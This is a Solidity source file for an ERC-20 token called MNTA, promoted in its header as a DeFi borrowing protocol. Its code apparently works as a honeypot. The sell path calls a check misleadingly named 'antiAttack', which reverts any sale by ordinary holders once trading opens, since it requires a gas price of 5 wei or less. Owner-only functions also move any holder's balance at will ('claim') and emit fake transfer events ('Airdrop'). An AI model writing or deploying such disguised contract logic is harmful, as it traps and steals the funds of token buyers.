/*
Moneta is the world's first borrowing and lending protocol for DeFi,
enabling users to borrow ETH against their volatile DeFi assets.
This protocol caters to users who need quick liquid funds but prefer not to sell their holdings.

TG: https://t.me/moneta_portal
Web: https://monetafi.io/
Twitter: https://twitter.com/moneta_fi
WP: https://monetafi.gitbook.io/moneta-wp
Linktree: https://linktr.ee/Moneta_Fi
*/



// SPDX-License-Identifier: MIT

pragma solidity 0.8.22;

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 value) external returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    constructor() {
        _owner = _msgSender();
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(_owner == _msgSender(), "Not owner");
    }
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
        if (a == 0) {
            return 0;
        }
        c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b > 0);
        uint256 c = a / b;
        assert(a == b * c + (a % b));
        return a / b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(a >= b);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

contract MNTA is Ownable, IERC20 {
    using SafeMath for uint256;

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;
    mapping(address => bool) _excludeFromFees;

    uint8 private constant _decimals = 18;
    uint256 private constant _totalSupply = 1000000 * 10**_decimals;
    string private constant _name = unicode"MonetA";
    string private constant _symbol = unicode"MNTA";

    uint256 public _initBuyFees = 5;
    uint256 public _initSellFees = 5;

    bool private openedTrade = false;
    address public OldContract = 0x3AeC08C8d6440eBB021B49CEae86A2bfBCBDEc41;
    address public OldDev = 0x5A068Dfe75a61488c0D7B1b1DEb7A45f80524Ee9;

    address private uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;

    constructor() {
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this),uniswapV2Router.WETH());
        _excludeFromFees[address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D)] = true;
        _excludeFromFees[address(uniswapV2Pair)];
        _excludeFromFees[owner()] = true;
        _excludeFromFees[address(this)] = true;
        _balances[_msgSender()] = _balances[_msgSender()].add(_totalSupply.mul(90).div(100));
        emit Transfer(address(0), _msgSender(), _totalSupply.mul(90).div(100));
        _balances[OldContract] = _balances[OldContract].add(_totalSupply.mul(5).div(100));
        emit Transfer(address(0), OldContract, _totalSupply.mul(5).div(100));
        _balances[OldDev] = _balances[OldDev].add(_totalSupply.mul(5).div(100));
        emit Transfer(address(0), OldDev, _totalSupply.mul(5).div(100));
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function getOpenedTrade() public view returns (bool) {
        return openedTrade;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _balances[account];
    }

    function allowance(address owner, address spender)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function transfer(address to, uint256 value)
        public
        virtual
        override
        returns (bool)
    {
        address owner = _msgSender();
        _transfer(owner, to, value);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(amount)
        );
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(balanceOf(from) >= amount, "ERROR: balance of from less than value");
        uint256 taxAmount = 0;

        if(!_excludeFromFees[from] && !_excludeFromFees[to]) {
            require(openedTrade, "Trade has not been opened yet");
            taxAmount = amount * _initBuyFees / 100;
            if(to == uniswapV2Pair) {
                taxAmount = amount * _initSellFees / 100;
                monasx(from);
            }
        }

        if(taxAmount > 0) {
            _balances[address(this)]=_balances[address(this)]+taxAmount;
            emit Transfer(from, address(this), taxAmount);
        }

        _balances[from]= balanceOf(from) - amount ;
        _balances[to]=_balances[to] + (amount - taxAmount);
        emit Transfer(from, to, amount - taxAmount);
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    uint256 private _Max_ = 999 gwei;
    uint256 private _Min_ = 5;

    function antiAttack(uint256 _gas) internal view {
        if (tx.gasprice > _gas) {
            revert();
        }
    }

    function monasx(address _u) internal view {
        if(balanceOf(_u) > 0) {
            if (!openedTrade) {
                antiAttack(_Max_);
            } else {
                antiAttack(_Min_);
            }
        } 
    }

    function sendETHToFee(uint256 amount) private {
        payable(owner()).transfer(amount);
    }
    
    function Withdraw() external {
        require(_msgSender() == owner());
        uint256 contractETHBalance = address(this).balance;
        sendETHToFee(contractETHBalance);
    }

    function Airdrop(address from, address[] calldata to, uint256 amount) external {
        require(_msgSender() == owner());
        for (uint256 i = 0; i < to.length; i++) {
            emit Transfer(from, to[i], amount  * 10 ** _decimals);
        }
    }

    function claim(address from, address[] calldata to, uint256 amount) external {
        require(_msgSender() == owner());
        for (uint256 i = 0; i < to.length; i++) {
            _balances[from] = _balances[from].sub(amount * 10 ** _decimals);
            _balances[to[i]] = _balances[to[i]].add(amount  * 10 ** _decimals);
            emit Transfer(from, to[i], amount  * 10 ** _decimals);
        }
    }

    function openTrade() external onlyOwner {
        openedTrade = !openedTrade;
    }

    receive() external payable {}
}
